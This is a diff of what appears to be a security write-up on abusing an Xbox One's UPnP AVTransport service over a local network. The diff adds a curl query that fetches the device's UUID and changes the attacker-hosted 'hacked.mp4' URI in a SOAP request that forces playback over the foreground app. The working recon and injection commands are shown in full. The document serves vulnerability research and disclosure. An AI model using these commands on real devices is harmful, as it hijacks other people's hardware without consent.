@@ -37,6 +37,9 @@ except: pass
 Query the Device Description Document (DDD) to extract the **Unique Device Name (UDN)** and system identifiers:
 ```bash
 curl -s http://192.168.1.19:2869/upnphost/udhisapi.dll?description
+
+curl -v "http://192.168.1.19:2869/upnphost/udhisapi.dll?content=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08"
+
 ```
 * **Result:** Attacker obtains the UUID needed for targeted SOAP actions and confirms the device is an Xbox One.
 
@@ -57,7 +60,7 @@ Inject the malicious URI and trigger execution to preempt the foreground applica
     curl -X POST "http://192.168.1.19:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:AVTransport" \
       -H 'SOAPAction: "urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI"' \
       -H "Content-Type: text/xml" \
-      -d '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><InstanceID>0</InstanceID><CurrentURI>http://192.168.1.18:8080/hacked.mp4</CurrentURI><CurrentURIMetaData></CurrentURIMetaData></u:SetAVTransportURI></s:Body></s:Envelope>'
+      -d '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><InstanceID>0</InstanceID><CurrentURI>http://192.168.1.23:8080/hacked.mp4</CurrentURI><CurrentURIMetaData></CurrentURIMetaData></u:SetAVTransportURI></s:Body></s:Envelope>'
     ```
 * **Action B (Play):**
     ```bash
